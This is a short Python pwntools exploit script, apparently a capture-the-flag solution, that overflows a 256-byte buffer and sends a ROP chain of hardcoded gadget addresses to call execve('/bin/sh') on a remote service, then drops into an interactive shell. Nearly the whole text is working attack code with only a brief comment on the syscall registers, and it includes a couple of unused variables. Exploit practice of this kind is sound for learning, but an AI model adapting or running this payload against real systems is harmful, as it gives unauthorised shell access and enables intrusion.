from pwn import *

sh = p64(0x483008)
pop_rax = p64(0x0046253b)
pop_rdi = p64(0x00413cfc)
pop_rsi = p64(0x0044e1e9)
pop_rdx = p64(0x0040177f)
uno = p64(0x2)
execve = "59" +"\x00"*6
syscall = p64(0x4738ca)

# ret2syscall
#
# RAX 59 (0x3b)         RDI (/bin/sh)           RSI (0)                         RDX (0)
# sys_execve    const char *filename    const char *const argv[]        const char *const envp[]
 
padding = "A"*256        # Padding
padding += p64(0x401e25) # Any value is valid. Here the EBP is overwritten
padding += pop_rax
padding += p64(0x3b)
padding += pop_rdi  
padding += sh
padding += pop_rsi
padding += p64(0) 
padding += pop_rdx
padding += p64(0) 
padding += syscall

p = remote("jh2i.com", 50002)

p.sendline(padding)
p.interactive()
